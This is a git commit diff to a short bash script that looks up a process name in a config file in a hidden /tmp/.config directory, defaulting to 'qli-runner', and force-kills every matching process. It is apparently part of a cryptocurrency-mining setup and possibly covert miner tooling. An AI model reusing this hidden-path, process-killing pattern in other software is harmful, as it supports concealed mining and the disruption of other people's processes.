1bbf1599528895aa6b8b6d95cfe6de26e5e21425
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-13 13:33:09 +0800

    Update k.sh

--- k.sh
+++ k.sh
@@ -1,18 +1,22 @@
 #!/bin/bash
 
-while true; do
-  #delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 21600]"
-  #[ -n "$delay" ] || break
-  #sleep "$delay"
-  [ -f "/tmp/.config/appsettings.json" ] || continue
-  pName=`grep "trainerBinary" "/tmp/.config/appsettings.json" |cut -d'"' -f4`
-  [ -n "$pName" ] || pName="qli-runner"
+kTask() {
+  [ -f "/tmp/.config/appsettings.json" ] || return 1;
+  pName=`grep "trainerBinary" "/tmp/.config/appsettings.json" |cut -d'"' -f4`;
+  [ -n "$pName" ] || pName="qli-runner";
   for pid in `ps -ef |grep "${pName}"  |grep -v 'grep' |awk '{print $2 " " $3}'`; do
     pid=`echo "$pid" |grep -o '[0-9]\+'`
     [ -n "$pid" ] || continue
     kill -9 "$pid" >/dev/null 2>&1
   done
-  sleep 60
+  return 0;
+}
+
+while true; do
+  #delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 21600]"
+  #[ -n "$delay" ] || break
+  #sleep "$delay"
+  kTask && break
 done
 
 
